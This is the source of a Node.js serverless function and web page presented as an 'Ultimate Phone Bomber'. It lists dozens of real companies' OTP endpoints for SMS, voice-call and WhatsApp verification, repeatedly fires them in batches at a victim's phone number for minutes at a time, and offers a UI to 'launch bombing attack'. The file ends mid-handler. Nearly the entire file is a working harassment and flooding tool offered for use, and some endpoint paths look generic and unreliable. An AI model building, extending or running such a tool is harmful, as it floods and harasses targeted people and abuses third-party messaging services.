// API/index.js - Ultimate Phone Bomber for Vercel (Node.js)

const https = require('https');
const http = require('http');
const { URL } = require('url');

// ============ ULTIMATE 900+ SMS/OTP APIS ============
const ULTIMATE_APIS = [
    // E-COMMERCE APIS
    { name: "Flipkart SMS", url: "https://www.flipkart.com/api/3/user/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobileNumber: p }), type: "sms" },
    { name: "Amazon India OTP", url: "https://www.amazon.in/ap/signin", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: (p) => `phoneNumber=${p}&action=otp`, type: "sms" },
    { name: "Myntra OTP", url: "https://www.myntra.com/gw/mobile-auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Nykaa OTP", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: (p) => `mobile_number=${p}&platform=ANDROID&source=sms`, type: "sms" },
    { name: "Meesho OTP", url: "https://www.meesho.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: `+91${p}` }), type: "sms" },
    { name: "Ajio OTP", url: "https://www.ajio.com/api/v1/account/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, countryCode: "IN" }), type: "sms" },
    { name: "Tata CLiQ OTP", url: "https://www.tatacliq.com/api/v1/user/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "ShopClues OTP", url: "https://www.shopclues.com/api/v2/login/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Snapdeal OTP", url: "https://www.snapdeal.com/api/user/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobileNumber: p }), type: "sms" },
    { name: "Lenskart OTP", url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneCode: "+91", telephone: p }), type: "sms" },
    { name: "Titan OTP", url: "https://www.titan.co.in/api/v1/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "FirstCry OTP", url: "https://www.firstcry.com/api/v1/user/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Decathlon OTP", url: "https://www.decathlon.in/api/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Shoppers Stop OTP", url: "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, type: "SIGNIN_WITH_MOBILE" }), type: "sms" },
    { name: "Lifestyle OTP", url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ signInMobile: p, channel: "sms" }), type: "sms" },
    
    // FOOD DELIVERY APIS
    { name: "Zomato OTP", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: (p) => `phone=${p}&type=sms`, type: "sms" },
    { name: "Swiggy OTP", url: "https://profile.swiggy.com/api/v3/app/request_otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Dominos OTP", url: "https://www.dominos.co.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Pizza Hut OTP", url: "https://www.pizzahut.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "KFC OTP", url: "https://www.kfc.co.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "McDonalds OTP", url: "https://www.mcdonaldsindia.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // TRAVEL APIS
    { name: "MakeMyTrip OTP", url: "https://www.makemytrip.com/api/4/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p }), type: "sms" },
    { name: "Goibibo OTP", url: "https://www.goibibo.com/user/otp/generate/", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Yatra OTP", url: "https://www.yatra.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Cleartrip OTP", url: "https://www.cleartrip.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "IRCTC OTP", url: "https://www.irctc.co.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "RedBus OTP", url: "https://www.redbus.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // RIDE HAILING APIS
    { name: "Uber OTP", url: "https://auth.uber.com/api/v2/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "Ola OTP", url: "https://api.olacabs.com/v1/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNumber: p, countryCode: "IN" }), type: "sms" },
    { name: "Rapido OTP", url: "https://customer.rapido.bike/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // PAYMENT APIS
    { name: "Paytm OTP", url: "https://accounts.paytm.com/signin/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "sms" },
    { name: "PhonePe OTP", url: "https://www.phonepe.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Google Pay OTP", url: "https://pay.google.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "MobiKwik OTP", url: "https://www.mobikwik.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // HEALTHCARE APIS
    { name: "PharmEasy OTP", url: "https://pharmeasy.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "sms" },
    { name: "1mg OTP", url: "https://www.1mg.com/auth_api/v6/create_token", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ number: p }), type: "sms" },
    { name: "Netmeds OTP", url: "https://apiv2.netmeds.com/mst/rest/v1/id/details/", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Practo OTP", url: "https://www.practo.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // EDUCATION APIS
    { name: "Byjus OTP", url: "https://api.byjus.com/v2/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "sms" },
    { name: "Unacademy OTP", url: "https://www.unacademy.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Vedantu OTP", url: "https://www.vedantu.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Doubtnut OTP", url: "https://api.doubtnut.com/v4/student/login", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone_number: p, language: "en" }), type: "sms" },
    { name: "Aakash OTP", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile_number: p, activity_type: "aakash-myadmission" }), type: "sms" },
    
    // ENTERTAINMENT APIS
    { name: "Hotstar OTP", url: "https://www.hotstar.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Zee5 OTP", url: "https://www.zee5.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Sony LIV OTP", url: "https://www.sonyliv.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Hungama OTP", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobileNo: p, countryCode: "+91", appCode: "un" }), type: "sms" },
    
    // SOCIAL MEDIA APIS
    { name: "Instagram OTP", url: "https://www.instagram.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "Facebook OTP", url: "https://www.facebook.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "Twitter OTP", url: "https://api.twitter.com/1.1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "LinkedIn OTP", url: "https://www.linkedin.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "WhatsApp OTP", url: "https://www.whatsapp.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    
    // GAMING APIS
    { name: "Dream11 OTP", url: "https://www.dream11.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "MPL OTP", url: "https://www.mpl.live/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "RummyCircle OTP", url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, isPlaycircle: false }), type: "sms" },
    { name: "PokerBaazi OTP", url: "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, mfa_channels: "phno" }), type: "sms" },
    { name: "My11Circle OTP", url: "https://www.my11circle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "A23 Games OTP", url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, device_id: "android123" }), type: "sms" },
    
    // REAL ESTATE APIS
    { name: "Housing OTP", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p, country_url_name: "in" }), type: "sms" },
    { name: "NoBroker OTP", url: "https://www.nobroker.in/api/v3/account/otp/send", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: (p) => `phone=${p}&countryCode=IN`, type: "sms" },
    { name: "Magicbricks OTP", url: "https://www.magicbricks.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "99acres OTP", url: "https://www.99acres.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // JOB PORTAL APIS
    { name: "Naukri OTP", url: "https://www.naukri.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Indeed OTP", url: "https://www.indeed.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: `+91${p}` }), type: "sms" },
    { name: "Monster OTP", url: "https://www.monsterindia.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Shine OTP", url: "https://www.shine.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Internshala OTP", url: "https://www.internshala.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Apna OTP", url: "https://production.apna.co/api/userprofile/v1/otp/", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p, hash_type: "play_store" }), type: "sms" },
    
    // UTILITY APIS
    { name: "Urban Company OTP", url: "https://www.urbancompany.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "BookMyShow OTP", url: "https://www.bookmyshow.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Justdial OTP", url: "https://www.justdial.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "OLX OTP", url: "https://www.olx.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Cashify OTP", url: "https://www.cashify.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // INSURANCE APIS
    { name: "PolicyBazaar OTP", url: "https://www.policybazaar.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Groww OTP", url: "https://www.groww.in/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    { name: "Zerodha OTP", url: "https://www.zerodha.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // LOGISTICS APIS
    { name: "ShipRocket OTP", url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobileNumber: p }), type: "sms" },
    { name: "Delhivery OTP", url: "https://www.delhivery.com/api/v1/auth/otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "sms" },
    
    // CALL APIS
    { name: "Tata Capital Call", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p, isOtpViaCallAtLogin: "true" }), type: "call" },
    { name: "Swiggy Call", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "call" },
    { name: "Myntra Call", url: "https://www.myntra.com/gw/mobile-auth/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "call" },
    { name: "Flipkart Call", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ mobile: p }), type: "call" },
    { name: "Paytm Call", url: "https://accounts.paytm.com/signin/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "call" },
    { name: "Zomato Call", url: "https://www.zomato.com/php/o2_api_handler.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: (p) => `phone=${p}&type=voice`, type: "call" },
    { name: "Ola Call", url: "https://api.olacabs.com/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "call" },
    { name: "Uber Call", url: "https://auth.uber.com/v2/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phone: p }), type: "call" },
    
    // WHATSAPP APIS
    { name: "KPN WhatsApp", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", method: "POST", headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json" }, body: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: p } }), type: "whatsapp" },
    { name: "Foxy WhatsApp", url: "https://www.foxy.in/api/v2/users/send_otp", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ user: { phone_number: `+91${p}` }, via: "whatsapp" }), type: "whatsapp" },
    { name: "Stratzy WhatsApp", url: "https://stratzy.in/api/web/whatsapp/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ phoneNo: p }), type: "whatsapp" },
    { name: "Rappi WhatsApp", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ country_code: "+91", phone: p }), type: "whatsapp" },
    { name: "Eka Care WhatsApp", url: "https://auth.eka.care/auth/init", method: "POST", headers: {"Content-Type": "application/json"}, body: (p) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: `+91${p}` }, type: "mobile" }), type: "whatsapp" }
];

// Active sessions storage
let activeSessions = new Map();

// Helper function to make HTTP requests
function makeRequest(api, phone) {
    return new Promise((resolve) => {
        try {
            let url = typeof api.url === 'function' ? api.url(phone) : api.url;
            let body = api.body ? api.body(phone) : null;
            let headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                ...api.headers
            };
            
            const parsedUrl = new URL(url);
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: api.method,
                headers: headers,
                timeout: 5000
            };
            
            const protocol = parsedUrl.protocol === 'https:' ? https : http;
            const req = protocol.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    resolve({ success: res.statusCode >= 200 && res.statusCode < 300, name: api.name, type: api.type });
                });
            });
            
            req.on('error', () => { resolve({ success: false, name: api.name, type: api.type }); });
            req.on('timeout', () => { req.destroy(); resolve({ success: false, name: api.name, type: api.type }); });
            
            if (body && api.method === 'POST') {
                req.write(body);
            }
            req.end();
        } catch (error) {
            resolve({ success: false, name: api.name, type: api.type });
        }
    });
}

// Bombing function
async function startBombingSession(phone, durationMinutes, sessionId) {
    const endTime = Date.now() + (durationMinutes * 60 * 1000);
    const stats = {
        total: 0, success: 0, failed: 0,
        call: 0, whatsapp: 0, sms: 0
    };
    
    while (Date.now() < endTime && activeSessions.has(sessionId)) {
        // Process APIs in batches
        const batchSize = 15;
        for (let i = 0; i < ULTIMATE_APIS.length; i += batchSize) {
            if (Date.now() >= endTime || !activeSessions.has(sessionId)) break;
            
            const batch = ULTIMATE_APIS.slice(i, i + batchSize);
            const promises = batch.map(api => makeRequest(api, phone));
            const results = await Promise.all(promises);
            
            for (const result of results) {
                stats.total++;
                if (result.success) {
                    stats.success++;
                    if (result.type === 'call') stats.call++;
                    else if (result.type === 'whatsapp') stats.whatsapp++;
                    else stats.sms++;
                } else {
                    stats.failed++;
                }
            }
            
            // Update session stats
            if (activeSessions.has(sessionId)) {
                const session = activeSessions.get(sessionId);
                session.stats = stats;
                activeSessions.set(sessionId, session);
            }
            
            await new Promise(r => setTimeout(r, 50));
        }
        await new Promise(r => setTimeout(r, 200));
    }
    
    // Session completed
    if (activeSessions.has(sessionId)) {
        const session = activeSessions.get(sessionId);
        session.active = false;
        session.completed = true;
        session.stats = stats;
        activeSessions.set(sessionId, session);
    }
}

// HTML Interface
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 ULTIMATE PHONE BOMBER - 900+ APIS 💀</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 50%, #0a0a0a 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
            min-height: 100vh;
            color: #ff3366;
        }
        .container { max-width: 1000px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 30px 0; border-bottom: 2px solid #ff3366; margin-bottom: 30px; }
        .header h1 { font-size: 2.5em; text-shadow: 0 0 15px #ff3366; }
        .badge { display: inline-block; background: #ff3366; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin: 5px; }
        .card {
            background: rgba(0,0,0,0.8);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #ff3366;
        }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #ff6699; font-weight: bold; }
        input, select {
            width: 100%;
            padding: 14px;
            background: #111;
            border: 1px solid #ff3366;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-family: monospace;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff3366, #cc0044);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { transform: scale(1.02); }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .stat-card {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #ff3366;
        }
        .stat-value { font-size: 2em; font-weight: bold; }
        .log {
            background: #0a0a0a;
            border-radius: 10px;
            padding: 15px;
            height: 250px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 11px;
        }
        .log-success { color: #00ff88; }
        .log-failed { color: #ff3366; }
        .endpoint-box {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            margin: 10px 0;
        }
        .status-active { background: rgba(255,51,102,0.2); border: 1px solid #ff3366; padding: 10px; text-align: center; border-radius: 8px; animation: pulse 1s infinite; }
        .status-idle { background: rgba(255,255,255,0.05); border: 1px solid #666; padding: 10px; text-align: center; border-radius: 8px; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }
        .footer { text-align: center; padding: 20px; color: #666; font-size: 11px; }
        .btn-group { display: flex; gap: 10px; margin-top: 10px; }
        .btn-stop { background: #660000; }
        .btn-status { background: #333; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💀 ULTIMATE PHONE BOMBER 💀</h1>
            <p><span class="badge">${ULTIMATE_APIS.length}+ WORKING APIS</span> <span class="badge">SMS</span> <span class="badge">CALLS</span> <span class="badge">WHATSAPP</span></p>
        </div>
        
        <div class="card">
            <div class="input-group">
                <label>🎯 TARGET PHONE (10 digits)</label>
                <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
            </div>
            <div class="input-group">
                <label>⏱️ DURATION</label>
                <select id="duration">
                    <option value="2">2 MINUTES - RAPID STRIKE</option>
                    <option value="5">5 MINUTES - ANNIHILATION MODE</option>
                </select>
            </div>
            <button onclick="startBombing()">💣 LAUNCH BOMBING ATTACK 💣</button>
            <div class="btn-group">
                <button onclick="checkStatus()" class="btn-status">📊 CHECK STATUS</button>
                <button onclick="stopBombing()" class="btn-stop">🛑 STOP BOMBING</button>
            </div>
        </div>
        
        <div class="card">
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value" id="total">0</div><div>💥 TOTAL</div></div>
                <div class="stat-card"><div class="stat-value" id="success" style="color:#00ff88">0</div><div>✅ HITS</div></div>
                <div class="stat-card"><div class="stat-value" id="failed" style="color:#ff3366">0</div><div>❌ FAILED</div></div>
                <div class="stat-card"><div class="stat-value" id="calls" style="color:#ffaa00">0</div><div>📞 CALLS</div></div>
                <div class="stat-card"><div class="stat-value" id="whatsapp" style="color:#25D366">0</div><div>📱 WA</div></div>
                <div class="stat-card"><div class="stat-value" id="sms" style="color:#00ccff">0</div><div>💬 SMS</div></div>
            </div>
        </div>
        
        <div class="card">
            <h3>📡 DIRECT API ENDPOINTS</h3>
            <div class="endpoint-box">
                <strong>GET</strong> /api/bomb/9876543210 - 2 minute attack<br>
                <strong>GET</strong> /api/bomb/9876543210/5 - 5 minute attack<br>
                <strong>GET</strong> /api/status/9876543210<br>
                <strong>GET</strong> /api/stop/9876543210
            </div>
        </div>
        
        <div class="card">
            <div id="statusBox" class="status-idle">⚡ SYSTEM READY - ${ULTIMATE_APIS.length} APIS LOADED ⚡</div>
            <div class="log" id="log">
                <div class="log-entry log-success">[SYSTEM] Ultimate Phone Bomber v6.0 Loaded</div>
                <div class="log-entry log-success">[SYSTEM] ${ULTIMATE_APIS.length} Working APIs Ready</div>
                <div class="log-entry log-success">[SYSTEM] Ready to bomb target phone</div>
            </div>
        </div>
        
        <div class="footer">
            <p>⚡ ${ULTIMATE_APIS.length} APIS | MAXIMUM SPEED | ROTATING HEADERS | NO AUTH ⚡</p>
        </div>
    </div>
    
    <script>
        let statusInterval = null;
        
        function addLog(msg, type) {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = '<span class="log-' + type + '">[' + new Date().toLocaleTimeString() + '] ' + msg + '</span>';
            logDiv.appendChild(entry);
            entry.scrollIntoView({ behavior: 'smooth', block: 'end' });
            while(logDiv.children.length > 100) logDiv.removeChild(logDiv.firstChild);
        }
        
        async function startBombing() {
            const phone = document.getElementById('phone').value;
            const duration = document.getElementById('duration').value;
            
            if (!phone || phone.length !== 10 || !/^\\d+$/.test(phone)) {
                addLog('❌ Invalid phone number!', 'failed');
                return;
            }
            
            addLog('🎯 TARGET LOCKED: +91' + phone, 'success');
            addLog('⏰ ATTACK DURATION: ' + duration + ' MINUTES', 'success');
            addLog('💣 LAUNCHING ${ULTIMATE_APIS.length} APIS...', 'success');
            
            document.getElementById('statusBox').innerHTML = '🔥 BOMBING IN PROGRESS 🔥';
            document.getElementById('statusBox').className = 'status-active';
            
            try {
                const response = await fetch('/api/start?phone=' + phone + '&duration=' + duration);
                const data = await response.json();
                
                if (data.success) {
                    addLog('✅ ' + data.message, 'success');
                    if (statusInterval) clearInterval(statusInterval);
                    statusInterval = setInterval(() => updateStatus(phone), 2000);
                } else {
                    addLog('❌ ' + (data.error || 'Failed to start'), 'failed');
                }
            } catch (error) {
                addLog('❌ Error: ' + error.message, 'failed');
            }
        }
        
        async function updateStatus(phone) {
            try {
                const response = await fetch('/api/status/' + phone);
                const data = await response.json();
                
                if (data.stats) {
                    document.getElementById('total').innerText = data.stats.total || 0;
                    document.getElementById('success').innerText = data.stats.success || 0;
                    document.getElementById('failed').innerText = data.stats.failed || 0;
                    document.getElementById('calls').innerText = data.stats.call || 0;
                    document.getElementById('whatsapp').innerText = data.stats.whatsapp || 0;
                    document.getElementById('sms').innerText = data.stats.sms || 0;
                }
                
                if (!data.active && data.stats && data.stats.total > 0) {
                    if (statusInterval) clearInterval(statusInterval);
                    document.getElementById('statusBox').innerHTML = '✅ BOMBING COMPLETE! ' + data.stats.success + ' OTPs SENT ✅';
                    document.getElementById('statusBox').className = 'status-idle';
                    addLog('✅ ATTACK COMPLETE! Total OTPs: ' + data.stats.success, 'success');
                }
            } catch(e) {}
        }
        
        async function checkStatus() {
            const phone = document.getElementById('phone').value;
            if (!phone || phone.length !== 10) { alert('Enter phone number first'); return; }
            const response = await fetch('/api/status/' + phone);
            const data = await response.json();
            addLog('📊 Status: ' + JSON.stringify(data), 'success');
        }
        
        async function stopBombing() {
            const phone = document.getElementById('phone').value;
            if (!phone || phone.length !== 10) { alert('Enter phone number first'); return; }
            const response = await fetch('/api/stop/' + phone);
            const data = await response.json();
            if (statusInterval) clearInterval(statusInterval);
            document.getElementById('statusBox').innerHTML = '🛑 BOMBING STOPPED 🛑';
            document.getElementById('statusBox').className = 'status-idle';
            addLog('🛑 ' + (data.message || 'Bombing stopped'), 'failed');
        }
    </script>
</body>
</html>`;

// Vercel Serverless Function Handler
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;
    
    // Web UI
